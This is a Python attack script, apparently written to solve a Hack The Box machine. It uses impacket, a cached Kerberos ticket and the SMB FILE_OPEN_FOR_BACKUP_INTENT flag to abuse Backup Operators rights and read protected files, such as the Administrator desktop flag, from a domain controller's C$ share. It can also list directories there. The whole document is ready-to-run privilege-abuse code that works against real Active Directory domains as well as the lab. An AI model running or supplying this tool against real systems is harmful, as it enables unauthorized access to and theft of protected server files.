#!/usr/bin/env python3
"""Kerberos SMB download with FILE_OPEN_FOR_BACKUP_INTENT (Backup Operators).

Uses KRB5CCNAME ticket (must already hold cifs/<target> ST or TGT that can get it).

Example:
  export KRB5CCNAME=/tmp/celia_bo.ccache
  python3 smb_bo_get.py \\
    --target dc01.darkzero.htb --dc-ip 172.16.20.1 \\
    --domain darkzero.ext --user celia \\
    --path 'Users\\\\Administrator\\\\Desktop\\\\root.txt' \\
    --out root.txt
"""
from __future__ import annotations

import argparse
import os
import sys


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--target", default="dc01.darkzero.htb", help="SMB hostname (SPN cifs/...)")
    p.add_argument("--dc-ip", default="172.16.20.1", help="target IP")
    p.add_argument("--kdc", default="172.16.20.2", help="KDC for kerberosLogin (EXT DC if referral already cached can be same)")
    p.add_argument("--domain", default="darkzero.ext")
    p.add_argument("--user", default="celia")
    p.add_argument("--share", default="C$")
    p.add_argument("--path", required=True, help=r"path under share, e.g. Users\Administrator\Desktop\root.txt")
    p.add_argument("--out", default="out.bin")
    p.add_argument("--list", metavar="GLOB", help="list path glob instead of download")
    args = p.parse_args()

    if not os.environ.get("KRB5CCNAME"):
        print("[-] set KRB5CCNAME to ccache with cifs ticket", file=sys.stderr)
        return 1

    from impacket.smbconnection import SMBConnection
    from impacket.smb3structs import (
        FILE_NON_DIRECTORY_FILE,
        FILE_OPEN,
        FILE_OPEN_FOR_BACKUP_INTENT,
        FILE_READ_DATA,
    )

    path = args.path.replace("/", "\\").lstrip("\\")
    conn = SMBConnection(args.target, args.dc_ip)
    conn.kerberosLogin(args.user, "", args.domain, kdcHost=args.kdc, useCache=True)

    if args.list:
        for f in conn.listPath(args.share, args.list):
            kind = "DIR" if f.is_directory() else str(f.get_filesize())
            print(f.get_longname(), kind)
        conn.logoff()
        return 0

    tree_id = conn.connectTree(args.share)
    create_options = FILE_NON_DIRECTORY_FILE | FILE_OPEN_FOR_BACKUP_INTENT
    file_id = conn.openFile(
        tree_id,
        path,
        desiredAccess=FILE_READ_DATA,
        shareMode=0x7,
        creationOption=create_options,
        creationDisposition=FILE_OPEN,
        fileAttributes=0,
    )
    with open(args.out, "wb") as out:
        offset = 0
        while True:
            data = conn.readFile(tree_id, file_id, offset, 65536)
            if not data:
                break
            out.write(data)
            offset += len(data)
    conn.closeFile(tree_id, file_id)
    conn.logoff()
    print(f"[+] wrote {args.out} ({offset} bytes)")
    try:
        text = open(args.out, "r", errors="replace").read().strip()
        if len(text) < 200 and "\x00" not in text:
            print(text)
    except Exception:
        pass
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
